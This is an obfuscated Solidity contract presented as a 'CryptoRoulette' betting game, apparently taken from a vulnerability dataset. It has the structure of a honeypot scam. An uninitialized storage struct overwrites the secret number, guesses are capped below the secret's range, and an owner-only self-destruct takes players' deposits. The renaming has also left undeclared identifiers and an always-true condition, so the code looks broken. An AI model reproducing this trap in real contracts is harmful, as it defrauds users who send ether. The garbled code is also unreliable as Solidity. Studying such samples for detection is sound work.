pragma solidity ^0.4.19;


contract CryptoRoulette {

    uint256 private _0x08f418;
    uint256 public _0x125486;
    uint256 public _0x44dc50 = 0.1 ether;
    address public _0xcf17f2;

    struct Game {
        address _0x948960;
        uint256 number;
    }
    Game[] public _0x05401f;

    function CryptoRoulette() public {
        _0xcf17f2 = msg.sender;
        _0xcb3966();
    }

    function _0xcb3966() internal {

        _0x08f418 = uint8(_0x4f9f2b(_0x366f5e, block.blockhash(block.number-1))) % 20 + 1;
    }

    function _0xc66f0b(uint256 number) payable public {
        require(msg.value >= _0x44dc50 && number <= 10);
        Game _0x3891b3;
        _0x3891b3._0x948960 = msg.sender;
        _0x3891b3.number = number;
        _0x05401f.push(_0x3891b3);

        if (number == _0x08f418) {

            msg.sender.transfer(this.balance);
        }

        _0xcb3966();
        if (msg.sender != address(0) || msg.sender == address(0)) { _0x125486 = _0x366f5e; }
    }

    function _0xaa8819() public {
        if (msg.sender == _0xcf17f2 && _0x366f5e > _0x125486 + 1 days) {
            suicide(msg.sender);
        }
    }

    function() public payable { }
}